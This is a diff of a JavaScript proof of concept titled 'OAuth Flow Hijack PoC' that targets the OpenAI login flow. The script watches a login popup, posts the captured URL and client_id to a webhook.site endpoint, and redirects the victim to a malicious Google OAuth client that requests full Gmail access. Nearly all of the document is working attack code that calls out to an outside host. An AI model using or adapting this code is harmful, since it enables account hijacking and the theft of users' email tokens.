@@ -1,54 +1,31 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>OAuth Flow Hijack PoC</title>
-</head>
-<body>
-  <h2>OAuth Flow Hijack PoC</h2>
-  <button onclick="launch()">Start Attack</button>
+<script>
+  const loginTarget = "https://auth.openai.com/log-in";
+  let win;
 
-  <script>
-    const loginTarget = "https://auth.openai.com/log-in";
-    const maliciousOAuthUrl = "https://accounts.google.com/o/oauth2/v2/auth?client_id=870583892774-o38qbckfb9vom8s7np3vqcb74cecjc3m.apps.googleusercontent.com&redirect_uri=https://zonia-bad.github.io/oauth-hijack-demo/redirect.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F";
+  function launch() {
+    win = window.open(loginTarget, "_blank", "width=900,height=700");
 
-    function launch() {
-      const win = window.open(loginTarget, "_blank", "width=900,height=700");
+    const interval = setInterval(() => {
+      try {
+        const redirectedUrl = win.location.href;
 
-      // Attempt to hijack the flow after 3 seconds
-      setTimeout(() => {
-        try {
-          win.location.replace(maliciousOAuthUrl);
-          console.log("Redirected login window to malicious OAuth client.");
-        } catch (err) {
-          console.warn("Window manipulation blocked:", err);
+        // Check if the OAuth URL with client_id is present
+        if (redirectedUrl.includes("client_id")) {
+          clearInterval(interval);
+
+          //**** Kindly replace this with your webhook (webhook.site)****
+          fetch("https://webhook.site/b90ffbf8-2d0e-4734-9487-d6b9cd9e94df", {
+            method: "POST",
+            headers: { "Content-Type": "text/plain" },
+            body: redirectedUrl
+          });
+
+          // Optionally continue to redirect to malicious flow
+          win.location.replace("https://accounts.google.com/o/oauth2/v2/auth?client_id=870583892774-o38qbckfb9vom8s7np3vqcb74cecjc3m.apps.googleusercontent.com&redirect_uri=https://zonia-bad.github.io/oauth-hijack-demo/redirect.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F");
         }
-      }, 3000);
-
-      // Monitor for legitimate client_id being exposed
-      const interval = setInterval(() => {
-        try {
-          const loc = win.location.href;
-          if (loc.includes("accounts.google.com/o/oauth2/v2/auth")) {
-            const url = new URL(loc);
-            const clientId = url.searchParams.get("client_id");
-
-            fetch("https://webhook.site/b90ffbf8-2d0e-4734-9487-d6b9cd9e94df", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                client_id: clientId,
-                full_url: loc
-              })
-            });
-
-            clearInterval(interval);
-            console.log("Captured client_id:", clientId);
-          }
-        } catch (err) {
-          // Ignore cross-origin access errors until redirected to Google
-        }
-      }, 500);
-    }
-  </script>
-</body>
-</html>
+      } catch (err) {
+        // Cross-origin frame access blocked until redirected to a same-origin page
+      }
+    }, 500);
+  }
+</script>
